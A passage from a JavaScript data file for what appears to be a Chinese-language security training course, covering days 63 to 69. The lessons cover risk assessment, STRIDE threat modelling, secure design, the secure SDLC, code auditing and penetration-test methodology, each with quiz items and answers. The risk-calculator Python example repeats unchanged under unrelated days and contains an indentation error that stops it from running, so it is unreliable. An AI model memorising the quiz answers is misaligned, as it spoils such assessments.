> **下一步**：Day 64 安全评估概述——风险评估方法论与工具。`,
  codeExample:{language:'python',code:'import random\n\nclass DataCenter:\n    \"\"\"数据中心物理安全监控\"\"\"\n    def __init__(self):\n        self.temp = 22.0  # 目标温度°C\n        self.humidity = 50  # 目标湿度%\n        self.tier = \"III\"  # 可并行维护\n    \n    def check_environment(self):\n        t = self.temp + random.uniform(-3, 3)\n        h = self.humidity + random.uniform(-10, 10)\n        alerts = []\n        if not (18 <= t <= 27): alerts.append(f\"⚠ 温度异常: {t:.1f}°C\")\n        if not (40 <= h <= 60): alerts.append(f\"⚠ 湿度异常: {h:.0f}%\")\n        return alerts or [\"✅ 环境正常\"]\n    \n    def tier_info(self):\n        tiers = {\"I\": \"99.671% | 年停机28.8h | 无冗余\",\n                 \"II\": \"99.741% | 年停机22h | 组件冗余\",\n                 \"III\": \"99.982% | 年停机1.6h | 可维护\",\n                 \"IV\": \"99.995% | 年停机<26min | 容错\"}\n        return tiers\n\ndc = DataCenter()\nprint(\"=== 数据中心监控 ===\")\nprint(f\"Tier标准: {dc.tier_info()}\")\nprint(f\"环境检测: {dc.check_environment()}\")',description:'物理安全环境监控'},
  quiz:[{"id":"q63-1","question":"物理安全分层模型最外层？","options":["设备安全", "周边安全(围墙/大门)", "机柜锁", "数据加密"],"correctIndex":1,"explanation":"从外到内:周边→建筑→机房→设备。"},{"id":"q63-2","question":"TEMPEST指什么？","options":["温控标准", "电磁泄露防护标准", "消防标准", "电源标准"],"correctIndex":1,"explanation":"TEMPEST=防电磁辐射泄露。"},{"id":"q63-3","question":"数据中心防静电措施？","options":["更多的电", "防静电地板+接地+湿度40-60%", "关空调", "塑料地板"],"correctIndex":1,"explanation":"控制湿度+接地=消除静电。"},{"id":"q63-4","question":"访客管理最佳实践？","options":["自由出入", "登记+陪同+临时证件+日志审计", "口头允许", "刷卡进入"],"correctIndex":1,"explanation":"访客=登记身份+全程陪同+临时访问权限。"},{"id":"q63-5","question":"消防喷淋系统为什么不适合机房？","options":["太贵", "水会损坏电子设备", "速度太慢", "不美观"],"correctIndex":1,"explanation":"机房=气体灭火(FM200/IG541),防设备损坏。"}],
  recommendedTools:weekToolMap[9]?.tools||[],labEnvironments:weekToolMap[9]?.labs||[],expertNotes:dayExpertNotes[63]||[],
});
allDays.push({
  id:'day-64',day:64,week:10,title:'安全评估概述（安全工程）',
  objectives:['安全评估框架','风险评估方法论','风险计算与定量分析'],
  content:`# Day 64：安全评估概述
## 一、安全评估框架
### 1.1 评估类型
\`\`\`
安全评估层级（从浅到深）：
  ① 差距分析(Gap Analysis)：现状vs标准
  ② 风险评估(Risk Assessment)：识别+分析+评价
  ③ 漏洞评估(Vulnerability Assessment)：技术脆弱性
  ④ 渗透测试(Penetration Test)：模拟真实攻击
  ⑤ 红蓝对抗(Red/Blue Team)：攻防实战演练
\`\`\`
### 1.2 风险评估核心要素
\`\`\`
风险 = f(资产, 威胁, 脆弱性)
┌──────────┐    ┌──────────┐    ┌──────────┐
│   资产    │    │   威胁    │    │  脆弱性   │
│  (Asset)  │    │ (Threat)  │    │(Vulnerability)│
├──────────┤    ├──────────┤    ├──────────┤
│ · 硬件    │    │ · 黑客    │    │ · 系统漏洞 │
│ · 软件    │    │ · 恶意软件 │    │ · 弱配置   │
│ · 数据    │    │ · 内部人员 │    │ · 缺补丁   │
│ · 人员    │    │ · 自然灾害 │    │ · 无加密   │
└────┬─────┘    └────┬─────┘    └────┬─────┘
     │               │               │
     └───────────────┼───────────────┘
                     │
                ┌────▼────┐
                │   风险   │
                │  (Risk)  │
                └────┬────┘
                     │
          ┌──────────▼──────────┐
          │     风险处置         │
          │ 规避/转移/缓解/接受  │
          └─────────────────────┘
\`\`\`
---
## 二、风险评估方法论
### 2.1 定性 vs 定量
| 维度 | 定性评估 | 定量评估 |
|------|---------|---------|
| 方法 | 高/中/低分级 | 数值/AEF/SLE/ALE |
| 速度 | ✅ 快 | 慢 |
| 精度 | ⚠️ 主观 | ✅ 客观(有数据时) |
| 适用 | 快速评估 | 详细评估、投资决策 |
| 成本 | 低 | 高 |
### 2.2 定量风险计算
\`\`\`
定量公式：
  资产价值 (AV) = Asset Value
  暴露因子 (EF) = 风险事件造成的资产损失比例
  单一损失期望 (SLE) = AV × EF
  年度发生率 (ARO) = 预计每年发生次数
  年度损失期望 (ALE) = SLE × ARO
示例：
  数据中心价值 AV = 1000万
  火灾损毁 EF = 100% = 1.0
  SLE = 1000万 × 1.0 = 1000万
  预计火灾 ARO = 0.01 (百年一遇)
  ALE = 1000万 × 0.01 = 10万/年
决策：
  如果防火方案成本 < 10万/年 → 值得实施
\`\`\`
---
## 三、风险计算与定量分析
### 3.1 风险矩阵
\`\`\`
风险等级 = 可能性 × 影响
        影响 → 低      中      高      严重
可能性 ↓  ┌──────┬──────┬──────┬──────┐
  几乎一定  │ 中    │ 高    │ 极高  │ 极高  │
  很可能   │ 中    │ 高    │ 高    │ 极高  │
  可能     │ 低    │ 中    │ 高    │ 高    │
  不太可能  │ 低    │ 低    │ 中    │ 高    │
  罕见     │ 低    │ 低    │ 低    │ 中    │
          └──────┴──────┴──────┴──────┘
极高：立即采取措施
高：  尽快处理
中：  计划处理
低：  可接受或监控`,
  codeExample:{language:'python',code:'print(\"=== 安全风险评估计算 ===\\n\")\n\n# 风险评估公式\nclass RiskCalculator:\n    @staticmethod\n    def ale(sle, aro):\n        \"\"\"年度预期损失 = 单次损失期望 × 年发生率\"\"\"\n        return sle * aro\n    \n    @staticmethod\n    def sle(av, ef):\n        \"\"\"单次损失期望 = 资产价值 × 暴露因子\"\"\"\n        return av * ef\n\n# 示例: 数据泄露风险评估\nav = 5000000  # 资产价值 500万\n ef = 0.3      # 暴露因子 30%\naro = 0.25     # 年发生率 0.25次/年\n\nsingle_loss = RiskCalculator.sle(av, ef)\nyearly_loss = RiskCalculator.ale(single_loss, aro)\n\nprint(f\"资产价值(AV): ¥{av:,}\")\nprint(f\"暴露因子(EF): {ef*100}%\")\nprint(f\"年发生率(ARO): {aro}次/年\")\nprint(f\"\\nSLE = AV×EF = ¥{single_loss:,}\")\nprint(f\"ALE = SLE×ARO = ¥{yearly_loss:,}\")',description:'风险计算演示'},
  quiz:[{"id":"q64-1","question":"风险评估公式ALE=？","options":["AV×EF", "SLE×ARO", "SLE+ARO", "SLE÷ARO"],"correctIndex":1,"explanation":"年度预期损失=单次损失期望×年发生率。"},{"id":"q64-2","question":"SLE的全称？","options":["System Loss Event", "Single Loss Expectancy", "Security Level Evaluation", "Software License"],"correctIndex":1,"explanation":"单次损失期望=AV×EF。"},{"id":"q64-3","question":"定量风险评估特点？","options":["用等级描述", "用具体数值(金额/概率)", "无需数据", "主观判断"],"correctIndex":1,"explanation":"定量=具体数值和概率。"},{"id":"q64-4","question":"风险评估第一步？","options":["计算风险", "资产识别", "实施控制", "编写报告"],"correctIndex":1,"explanation":"先识别资产→威胁→脆弱性→计算风险。"},{"id":"q64-5","question":"残余风险(Residual Risk)指？","options":["无风险", "采取控制措施后仍剩余的风险", "初始风险", "已消除风险"],"correctIndex":1,"explanation":"残余风险=控制后剩余,需管理者接受。"}],
  recommendedTools:weekToolMap[10]?.tools||[],labEnvironments:weekToolMap[10]?.labs||[],expertNotes:dayExpertNotes[64]||[],
});
allDays.push({
  id:'day-65',day:65,week:10,title:'威胁建模（安全工程）',
  objectives:['威胁建模概述','STRIDE模型详解','攻击树分析'],
  content:`# Day 65：威胁建模
## 一、威胁建模概述
### 1.1 威胁建模价值
\`\`\`
威胁建模：在设计阶段系统地识别和应对安全威胁
核心问题：
  "如果我是攻击者，我会怎么攻击这个系统？"
价值：
  ✅ 设计阶段发现安全问题（修复成本最低）
  ✅ 系统化发现所有潜在威胁
  ✅ 优先级排序
  ✅ 指导安全测试
\`\`\`
### 1.2 方法论对比
| 方法论 | 特点 | 适用 |
|--------|------|------|
| STRIDE | 微软，6类威胁分类 | 通用软件系统 |
| PASTA | 风险为中心 | 企业风险管理 |
| Trike | 开源，需求驱动 | 安全审计 |
| VAST | 可扩展、敏捷 | DevOps环境 |
| Attack Tree | 攻击路径可视化 | 复杂系统 |
---
## 二、STRIDE模型详解
### 2.1 六类威胁
\`\`\`
S → Spoofing (欺骗/冒充)
  "我是管理员！"(伪造身份)
  防御：强认证(多因素、证书)
T → Tampering (篡改)
  "我已经修改了订单金额"
  防御：完整性校验、数字签名、WORM
R → Repudiation (抵赖/否认)
  "这个交易不是我做的！"
  防御：审计日志、数字签名、区块链存证
I → Information Disclosure (信息泄露)
  "我看到了用户密码"
  防御：加密、访问控制、数据脱敏
D → Denial of Service (拒绝服务)
  "服务器已经无法响应了"
  防御：冗余、限流、CDN/WAF
E → Elevation of Privilege (权限提升)
  "我现在是管理员了"
  防御：最小权限、沙箱、安全编码
\`\`\`
### 2.2 STRIDE对应安全属性
\`\`\`
CIA匹配：
  S(欺骗) → 认证(Authentication)
  T(篡改) → 完整性(Integrity)
  R(抵赖) → 不可否认性(Non-Repudiation)
  I(泄露) → 机密性(Confidentiality)
  D(拒绝服务) → 可用性(Availability)
  E(提权) → 授权(Authorization)
\`\`\`
---
## 三、攻击树分析
### 3.1 攻击树结构
\`\`\`
攻击目标：盗取用户数据库
              (OR)
         ┌─────┴─────┐
         │           │
    Web应用攻击    物理入侵
       (OR)        (AND)
   ┌────┴────┐   ┌──┴──┐
   │         │   │     │
  SQL注入   XSS  撬门  破解门禁
  (OR)            (成本:高)
  ┌──┴──┐
  │     │
Union 盲注
(成本:中)
叶子节点标注：
  · 成本/难度 (Cost/Difficulty)
  · 是否需要认证
  · 是否需要物理接触
\`\`\`
### 3.2 攻击树价值
\`\`\`
分析攻击树可以：`,
  codeExample:{language:'python',code:'print(\"=== 安全风险评估计算 ===\\n\")\n\n# 风险评估公式\nclass RiskCalculator:\n    @staticmethod\n    def ale(sle, aro):\n        \"\"\"年度预期损失 = 单次损失期望 × 年发生率\"\"\"\n        return sle * aro\n    \n    @staticmethod\n    def sle(av, ef):\n        \"\"\"单次损失期望 = 资产价值 × 暴露因子\"\"\"\n        return av * ef\n\n# 示例: 数据泄露风险评估\nav = 5000000  # 资产价值 500万\n ef = 0.3      # 暴露因子 30%\naro = 0.25     # 年发生率 0.25次/年\n\nsingle_loss = RiskCalculator.sle(av, ef)\nyearly_loss = RiskCalculator.ale(single_loss, aro)\n\nprint(f\"资产价值(AV): ¥{av:,}\")\nprint(f\"暴露因子(EF): {ef*100}%\")\nprint(f\"年发生率(ARO): {aro}次/年\")\nprint(f\"\\nSLE = AV×EF = ¥{single_loss:,}\")\nprint(f\"ALE = SLE×ARO = ¥{yearly_loss:,}\")',description:'风险计算演示'},
  quiz:[{"id":"q65-1","question":"STRIDE中S代表？","options":["Speed", "Spoofing(欺骗/伪装身份)", "Security", "Storage"],"correctIndex":1,"explanation":"Spoofing Identity=身份欺骗。"},{"id":"q65-2","question":"STRIDE中T代表？","options":["Time", "Tampering(篡改数据)", "Testing", "Training"],"correctIndex":1,"explanation":"Tampering with Data。"},{"id":"q65-3","question":"STRIDE中R代表？","options":["Reading", "Repudiation(抵赖)", "Recovery", "Risk"],"correctIndex":1,"explanation":"R=否认做过某个操作。"},{"id":"q65-4","question":"攻击树(Attack Tree)的根节点？","options":["攻击方法", "攻击最终目标", "漏洞", "防御"],"correctIndex":1,"explanation":"根节点=攻击目标,叶子=攻击方法。"},{"id":"q65-5","question":"威胁建模第一步？","options":["画数据流图(DFD)", "做攻击树", "写代码", "测试"],"correctIndex":0,"explanation":"先了解系统(DFD)→识别威胁→评估。"}],
  recommendedTools:weekToolMap[10]?.tools||[],labEnvironments:weekToolMap[10]?.labs||[],expertNotes:dayExpertNotes[65]||[],
});
allDays.push({
  id:'day-66',day:66,week:10,title:'安全架构设计（安全工程）',
  objectives:['安全架构设计原则','纵深防御','安全架构模式'],
  content:`# Day 66：安全架构设计
## 一、安全架构设计原则
### 1.1 核心八原则
\`\`\`
① 最小权限 (Least Privilege)
   仅授予完成任务所需的最小权限
② 默认拒绝 (Default Deny)
   默认禁止，显式允许
③ 纵深防御 (Defense in Depth)
   多层安全控制，不依赖单一防线
④ 安全默认值 (Secure by Default)
   出厂/安装默认就是最安全配置
⑤ 失败安全 (Fail-Safe / Fail-Secure)
   出错时倾向于拒绝访问
⑥ 经济性机制 (Economy of Mechanism)
   设计越简单越安全（简单可验证）
⑦ 最小公共化 (Least Common Mechanism)
   不同主体间最小化共享机制
⑧ 开放设计 (Open Design / Kerckhoffs原理)
   安全性不应依赖设计的保密性
   安全性应来自密钥的保密性
\`\`\`
### 1.2 Saltzer & Schroeder原则（经典）
\`\`\`
1975年提出，至今仍适用：
"安全性不应依赖攻击者对系统设计的不了解"
  = 不要依赖"隐匿式安全" (Security by Obscurity)
"保护机制越简单越好"
  = 复杂=难以验证=容易有bug
"每次访问都应检查权限"
  = 不要缓存授权决定过久
\`\`\`
---
## 二、纵深防御
### 2.1 多层架构
\`\`\`
┌────────────────────────────────────────────┐
│  Layer 7: 数据保护 (加密、脱敏、DLP)       │
├────────────────────────────────────────────┤
│  Layer 6: 应用安全 (WAF、输入验证、安全编码)│
├────────────────────────────────────────────┤
│  Layer 5: 主机安全 (HIDS、防病毒、加固)     │
├────────────────────────────────────────────┤
│  Layer 4: 网络安全 (防火墙、IDS/IPS、分段)  │
├────────────────────────────────────────────┤
│  Layer 3: 物理安全 (门禁、监控、环境控制)   │
├────────────────────────────────────────────┤
│  Layer 2: 身份和访问 (MFA、IAM、权限管理)   │
├────────────────────────────────────────────┤
│  Layer 1: 策略和规程 (安全制度、培训)       │
└────────────────────────────────────────────┘
关键理念：没有一个安全层是100%完美的
         但多层叠加 = 极大提高攻击成本
\`\`\`
---
## 三、安全架构模式
### 3.1 常见模式
| 模式 | 描述 | 适用 |
|------|------|------|
| **PDP/PEP** | 策略决策点+策略执行点分离 | 微服务/API |
| **API Gateway** | 统一入口+认证+限流+日志 | 前后端分离 |
| **Sidecar代理** | 服务网格(如Envoy) | 服务间安全通信 |
| **反向代理** | 隐藏后端、SSL卸载、WAF | Web安全 |
| **堡垒机** | 统一运维入口+审计 | 服务器管理 |
| **DMZ** | 隔离公开服务 | 边界防护 |
| **断路器** | 服务熔断防雪崩 | 微服务韧性 |
### 3.2 PDP/PEP模式
\`\`\`
PDP + PEP (XACML, ABAC)：
  User → PEP(策略执行点) → Resource
              │
              ▼ (请求决策)
          PDP(策略决策点)
              │
              ▼
          Policy Store (策略存储)
PEP：拦截请求 → 问PDP → 放行或拒绝
PDP：根据策略+属性 → 做出决策
\`\`\`
---`,
  codeExample:{language:'python',code:'print(\"=== 安全风险评估计算 ===\\n\")\n\n# 风险评估公式\nclass RiskCalculator:\n    @staticmethod\n    def ale(sle, aro):\n        \"\"\"年度预期损失 = 单次损失期望 × 年发生率\"\"\"\n        return sle * aro\n    \n    @staticmethod\n    def sle(av, ef):\n        \"\"\"单次损失期望 = 资产价值 × 暴露因子\"\"\"\n        return av * ef\n\n# 示例: 数据泄露风险评估\nav = 5000000  # 资产价值 500万\n ef = 0.3      # 暴露因子 30%\naro = 0.25     # 年发生率 0.25次/年\n\nsingle_loss = RiskCalculator.sle(av, ef)\nyearly_loss = RiskCalculator.ale(single_loss, aro)\n\nprint(f\"资产价值(AV): ¥{av:,}\")\nprint(f\"暴露因子(EF): {ef*100}%\")\nprint(f\"年发生率(ARO): {aro}次/年\")\nprint(f\"\\nSLE = AV×EF = ¥{single_loss:,}\")\nprint(f\"ALE = SLE×ARO = ¥{yearly_loss:,}\")',description:'风险计算演示'},
  quiz:[{"id":"q66-1","question":"纵深防御(Defense in Depth)核心理念？","options":["单一防线", "多层安全控制叠加(不依赖单点)", "防火墙最重要", "仅加密"],"correctIndex":1,"explanation":"多层防御=任何单层失效仍有保护。"},{"id":"q66-2","question":"默认安全(Secure by Default)含义？","options":["默认打开所有功能", "默认情况下最小权限+关闭不必要功能", "默认加密", "默认监控"],"correctIndex":1,"explanation":"出厂即安全=最小功能+最小权限。"},{"id":"q66-3","question":"零信任三大技术支柱？","options":["防火墙", "微隔离+身份认证+持续监控", "VPN", "加密"],"correctIndex":1,"explanation":"零信任三支柱。"},{"id":"q66-4","question":"SABSA架构框架的核心？","options":["技术驱动", "业务驱动安全(Business-driven)", "产品驱动", "合规驱动"],"correctIndex":1,"explanation":"SABSA=从业务需求导出安全需求。"},{"id":"q66-5","question":"TOGAF中安全架构归属？","options":["业务架构", "贯穿所有架构域", "数据架构", "技术架构"],"correctIndex":1,"explanation":"安全架构是贯穿性关注点。"}],
  recommendedTools:weekToolMap[10]?.tools||[],labEnvironments:weekToolMap[10]?.labs||[],expertNotes:dayExpertNotes[66]||[],
});
allDays.push({
  id:'day-67',day:67,week:10,title:'安全开发生命周期（安全工程）',
  objectives:['安全SDLC模型比较','各阶段安全活动','安全需求与滥用案例'],
  content:`# Day 67：安全开发生命周期
## 一、安全SDLC模型比较
### 1.1 三种主流模型
\`\`\`
┌──────────┬────────────────┬─────────────────────────┐
│   模型    │      提出方     │          特点           │
├──────────┼────────────────┼─────────────────────────┤
│ Microsoft│ Microsoft      │ 7阶段：培训→需求→设计   │
│ SDL      │                │ →实现→验证→发布→响应   │
├──────────┼────────────────┼─────────────────────────┤
│ BSIMM    │ Cigital/Synopsys│ 成熟度模型，12个实践   │
│          │                │ 基准对比而非照搬        │
├──────────┼────────────────┼─────────────────────────┤
│ OWASP    │ OWASP          │ 轻量级，社区驱动        │
│ SAMM     │                │ 5业务功能×3成熟度       │
└──────────┴────────────────┴─────────────────────────┘
\`\`\`
### 1.2 传统SDLC vs 安全SDLC
\`\`\`
传统瀑布SDLC：      安全SDLC：
  需求 →             需求 + 安全需求
  设计 →             设计 + 威胁建模 + 安全架构
  编码 →             编码 + 安全编码 + SAST
  测试 →             测试 + DAST + 渗透测试
  部署 →             部署 + 安全配置 + 审核
  维护 →             维护 + 漏洞响应 + 事件管理
\`\`\`
---
## 二、各阶段安全活动
### 2.1 安全活动矩阵
\`\`\`
┌─────────┬──────────────────────────────────────┐
│   阶段   │              安全活动                │
├─────────┼──────────────────────────────────────┤
│  需求    │ 安全需求、隐私风险、合规要求分析       │
│  设计    │ 威胁建模(STRIDE)、安全架构评审        │
│  编码    │ 安全编码规范、SAST、代码审查          │
│  测试    │ DAST、渗透测试、模糊测试             │
│  部署    │ 安全加固、配置检查、最终安全评审      │
│  运维    │ 漏洞管理、事件响应、补丁管理          │
└─────────┴──────────────────────────────────────┘
\`\`\`
---
## 三、安全需求与滥用案例
### 3.1 滥用案例(Abuse Case)
\`\`\`
正常用例 vs 滥用案例：
正常用例：用户登录
  前置条件：已注册 → 输入用户名/密码 → 验证通过 → 进入系统
滥用案例1：暴力破解
  恶意用户 → 自动化工具 → 大量密码尝试 → 如果无锁定机制 → 破解
滥用案例2：凭据泄露
  攻击者 → 获取泄漏的密码 → 尝试登录 → 如果无MFA → 成功
滥用案例价值：
  → 在设计阶段就想"攻击者会怎么做"
  → 每个正常用例产生2-3个滥用案例
  → 针对滥用案例设计防御
\`\`\`
---
## 四、安全测试类型
\`\`\`
测试金字塔（从底层到顶层）：
        ┌──────┐
        │ 手动  │ ← 渗透测试
        │ 渗透  │
       ┌┴──────┴┐
       │  DAST  │ ← 动态扫描
      ┌┴────────┴┐
      │   IAST   │ ← 交互式(agent插桩)
     ┌┴──────────┴┐
     │    SAST    │ ← 静态代码分析
    ┌┴────────────┴┐
    │ 单元测试+安全 │ ← 开发阶段
    └─────────────┘
SAST (Static)：  不运行，分析源码 → 早期发现
DAST (Dynamic)： 运行中，黑盒测试 → 模拟攻击
IAST (Interactive)：运行时插桩 → 精准定位
SCA (Composition)：依赖组件 → 已知漏洞
\`\`\`
---`,
  codeExample:{language:'python',code:'print(\"=== 安全风险评估计算 ===\\n\")\n\n# 风险评估公式\nclass RiskCalculator:\n    @staticmethod\n    def ale(sle, aro):\n        \"\"\"年度预期损失 = 单次损失期望 × 年发生率\"\"\"\n        return sle * aro\n    \n    @staticmethod\n    def sle(av, ef):\n        \"\"\"单次损失期望 = 资产价值 × 暴露因子\"\"\"\n        return av * ef\n\n# 示例: 数据泄露风险评估\nav = 5000000  # 资产价值 500万\n ef = 0.3      # 暴露因子 30%\naro = 0.25     # 年发生率 0.25次/年\n\nsingle_loss = RiskCalculator.sle(av, ef)\nyearly_loss = RiskCalculator.ale(single_loss, aro)\n\nprint(f\"资产价值(AV): ¥{av:,}\")\nprint(f\"暴露因子(EF): {ef*100}%\")\nprint(f\"年发生率(ARO): {aro}次/年\")\nprint(f\"\\nSLE = AV×EF = ¥{single_loss:,}\")\nprint(f\"ALE = SLE×ARO = ¥{yearly_loss:,}\")',description:'风险计算演示'},
  quiz:[{"id":"q67-1","question":"Microsoft SDL包括几个阶段？","options":["5", "7", "10", "3"],"correctIndex":1,"explanation":"SDL=培训→需求→设计→实现→验证→发布→响应。"},{"id":"q67-2","question":"SAST(静态测试)特点？","options":["运行时代码分析", "不运行代码,分析源码/字节码(白盒)", "黑盒扫描", "渗透测试"],"correctIndex":1,"explanation":"SAST=静态分析,白盒。"},{"id":"q67-3","question":"DAST(动态测试)特点？","options":["看源码", "运行应用后测试(黑盒)", "编译检查", "人工审计"],"correctIndex":1,"explanation":"DAST=黑盒动态扫描。"},{"id":"q67-4","question":"IAST融合了什么？","options":["仅SAST", "SAST+DAST(插桩实时分析)", "仅DAST", "人工测试"],"correctIndex":1,"explanation":"IAST=插桩实时监控+SAST+DAST。"},{"id":"q67-5","question":"BSIMM是什么？","options":["技术标准", "软件安全成熟度模型(Building Security In)", "编程语言", "操作系统"],"correctIndex":1,"explanation":"BSIMM=Maturity Model衡量组织安全实践。"}],
  recommendedTools:weekToolMap[10]?.tools||[],labEnvironments:weekToolMap[10]?.labs||[],expertNotes:dayExpertNotes[67]||[],
});
allDays.push({
  id:'day-68',day:68,week:10,title:'代码审计（安全工程）',
  objectives:['代码审计方法论','自动化 vs 手动审计','常见漏洞模式识别'],
  content:`# Day 68：代码审计
## 一、代码审计方法论
### 1.1 审计方式对比
\`\`\`
┌──────────────┬──────────────────┬──────────────────┐
│    方式       │      优点        │      缺点        │
├──────────────┼──────────────────┼──────────────────┤
│ 逐行审查      │ 最彻底            │ 极耗时间          │
│ 功能点审查    │ 效率较高          │ 可能遗漏          │
│ 补丁审计      │ 专注变更          │ 不覆盖全貌        │
│ 自动化工具    │ 快速+覆盖全       │ 高误报率          │
│ 手动+自动化   │ ✅ 推荐组合      │ 需要技能          │
└──────────────┴──────────────────┴──────────────────┘
\`\`\`
### 1.2 Source vs Sink追踪
\`\`\`
Source → 传播路径 → Sink 分析方法：
Source (不可信输入)：
  · request.getParameter()
  · $_GET/$_POST/$_COOKIE
  · req.body, req.query
Propagation (传播)：
  · 变量赋值、字符串拼接
  · 不安全的清理/转义函数
Sink (危险操作)：
  · SQL拼接 → SQL注入
  · innerHTML → XSS
  · eval() → 代码执行
  · Process.exec() → 命令注入
  · include() → LFI/RFI
\`\`\`
---
## 二、自动化 vs 手动审计
\`\`\`
SAST能发现：                 SAST不能发现：
  ✅ SQL注入                  ❌ 业务逻辑漏洞
  ✅ XSS                      ❌ 认证绕过逻辑
  ✅ 命令注入                  ❌ 权限设计缺陷
  ✅ 硬编码密钥                ❌ 需要上下文的漏洞
  ✅ 不安全配置                 ❌ 多步骤攻击链
  ✅ 已知CWE模式               ❌ 0-day漏洞
结论：SAST + 手动审查 = 最佳效果
\`\`\`
---
## 三、常见漏洞模式识别
### 3.1 高危模式速查
\`\`\`
① 字符串拼接构造SQL → SQL注入
② 用户输入直接输出到HTML → XSS  
③ 文件路径拼接用户输入 → 路径穿越
④ 反序列化未验证数据 → RCE
⑤ 使用弱哈希(MD5/SHA1) → 加密弱化
⑥ 硬编码密码/密钥 → 凭证泄露
⑦ eval/exec执行用户数据 → 代码注入
⑧ include动态路径 → LFI/RFI
\`\`\`
---
## 四、代码审计流程
\`\`\`
审计标准流程：
① 信息收集：了解架构、技术栈、框架
② 自动化扫描：SAST跑一遍→获取初筛结果
③ 手动确认：过滤误报，确认真实漏洞
④ 深度审计：Source→Sink追踪关键路径
⑤ 报告编写：漏洞描述 + 修复建议 + 代码示例
⑥ 验证修复：复审修复代码
\`\`\`
---
| 考点 | 记忆要点 |
|------|---------|
| Source/Sink方法 | "追踪不可信输入到危险操作的路径" |
| SAST局限 | "不能发现业务逻辑漏洞和设计缺陷" |
| 审计黄金组合 | "SAST自动化 + 手动深度审查" |
---
- [ ] Source→Sink追踪方法？
- [ ] SAST的局限性有哪些？
- [ ] 至少8种常见漏洞模式？
- [ ] 代码审计标准流程？
---
> **下一步**：Day 70 第十周总结与测验。`,
  codeExample:{language:'python',code:'print(\"=== 安全风险评估计算 ===\\n\")\n\n# 风险评估公式\nclass RiskCalculator:\n    @staticmethod\n    def ale(sle, aro):\n        \"\"\"年度预期损失 = 单次损失期望 × 年发生率\"\"\"\n        return sle * aro\n    \n    @staticmethod\n    def sle(av, ef):\n        \"\"\"单次损失期望 = 资产价值 × 暴露因子\"\"\"\n        return av * ef\n\n# 示例: 数据泄露风险评估\nav = 5000000  # 资产价值 500万\n ef = 0.3      # 暴露因子 30%\naro = 0.25     # 年发生率 0.25次/年\n\nsingle_loss = RiskCalculator.sle(av, ef)\nyearly_loss = RiskCalculator.ale(single_loss, aro)\n\nprint(f\"资产价值(AV): ¥{av:,}\")\nprint(f\"暴露因子(EF): {ef*100}%\")\nprint(f\"年发生率(ARO): {aro}次/年\")\nprint(f\"\\nSLE = AV×EF = ¥{single_loss:,}\")\nprint(f\"ALE = SLE×ARO = ¥{yearly_loss:,}\")',description:'风险计算演示'},
  quiz:[{"id":"q68-1","question":"代码审计中断点位置最重要？","options":["入口函数", "用户输入进入系统的位置(source→sink)", "结尾", "中间"],"correctIndex":1,"explanation":"跟踪Source(输入)→Sink(危险函数)。"},{"id":"q68-2","question":"OWASP代码审计最关注？","options":["性能", "数据流转(污点分析)", "可读性", "注释"],"correctIndex":1,"explanation":"污点分析=追踪外部输入是否到达危险函数。"},{"id":"q68-3","question":"命令注入典型危险函数(Java)？","options":["System.out.println", "Runtime.getRuntime().exec()", "System.getProperty", "Thread.sleep"],"correctIndex":1,"explanation":"exec()=危险。"},{"id":"q68-4","question":"路径遍历(Path Traversal)防御？","options":["黑名单", "输入规范化为绝对路径+白名单目录检查", "禁用..", "加密"],"correctIndex":1,"explanation":"规范化路径+目录白名单。"},{"id":"q68-5","question":"代码审计自动化工具局限性？","options":["无局限", "误报/漏报,无法理解业务逻辑", "太慢", "太贵"],"correctIndex":1,"explanation":"自动化工具需结合人工审计。"}],
  recommendedTools:weekToolMap[10]?.tools||[],labEnvironments:weekToolMap[10]?.labs||[],expertNotes:dayExpertNotes[68]||[],
});
allDays.push({
  id:'day-69',day:69,week:10,title:'安全测试与渗透测试（安全工程）',
  objectives:['安全测试体系','渗透测试方法论','PTES渗透测试执行标准'],
  content:`# Day 69：安全测试与渗透测试
## 一、安全测试体系
\`\`\`
安全测试金字塔：
         ┌──────────────┐
         │   红蓝对抗    │ ← 最接近真实
        ┌┴──────────────┴┐
        │   渗透测试      │ ← 模拟攻击
       ┌┴────────────────┴┐
       │  DAST + IAST     │ ← 动态/交互测试
      ┌┴──────────────────┴┐
      │  漏洞扫描 + SAST   │ ← 自动扫描
     ┌┴────────────────────┴┐
     │ 单元测试 + 安全用例   │ ← 开发阶段
     └─────────────────────┘
\`\`\`
### 1.1 测试类型对比
| 类型 | 视角 | 方法 | 时机 |
|------|------|------|------|
| SAST | 白盒 | 源码分析 | 开发期 |
| DAST | 黑盒 | 发起攻击 | 测试期 |
| IAST | 灰盒 | 运行时插桩 | 测试期 |
| 渗透测试 | 攻击者 | 手动利用 | 测试/上线前 |
| 红蓝对抗 | 红队vs蓝队 | 持续对抗 | 持续 |
---
## 二、渗透测试方法论
### 2.1 黑盒/白盒/灰盒
\`\`\`
黑盒 (Black Box)：
  测试者零先验知识，模拟外部攻击者
  → 最真实的外部威胁
  → 耗时最长，可能遗漏
白盒 (White Box)：
  测试者有完整系统信息(源码、架构、配置)
  → 覆盖最全面
  → 不模拟真实攻击者水平
灰盒 (Grey Box)：
  测试者有部分信息(如用户账号)
  → 平衡真实性和效率
  → 推荐用于大部分场景
\`\`\`
---
## 三、PTES渗透测试执行标准
\`\`\`
PTES七阶段：
① 前期交互 (Pre-Engagement)
   范围、规则、授权、时间窗口
② 信息收集 (Intelligence Gathering)
   开源情报(OSINT)：域名、IP、子域名、员工信息
③ 威胁建模 (Threat Modeling)
   基于收集的信息确定攻击路径
④ 漏洞分析 (Vulnerability Analysis)
   扫描+手动验证漏洞
⑤ 漏洞利用 (Exploitation)
   获取访问权限
⑥ 后利用 (Post-Exploitation)
   横向移动、权限提升、数据获取
⑦ 报告 (Reporting)
   执行摘要 + 技术发现 + 修复建议
\`\`\`
---
## 四、漏洞扫描与验证
\`\`\`
扫描策略：
  ① 主机发现 (Nmap -sn)
  ② 端口扫描 (Nmap -sS/sT)
  ③ 服务版本 (Nmap -sV)
  ④ 漏洞扫描 (Nessus/OpenVAS)
  ⑤ Web扫描 (Burp Suite/ZAP)
验证原则：
  不要只信任扫描报告 → 每个发现需手动验证
  分清误报和真阳性 → 避免浪费修复资源
\`\`\`
---
## 五、模糊测试(Fuzzing)
\`\`\`
Fuzzing = 大量非预期/随机数据输入看是否崩溃
类型：
  黑盒模糊：不需要源码 → 快速但浅
  灰盒模糊：插桩观察覆盖率 → 更深`,
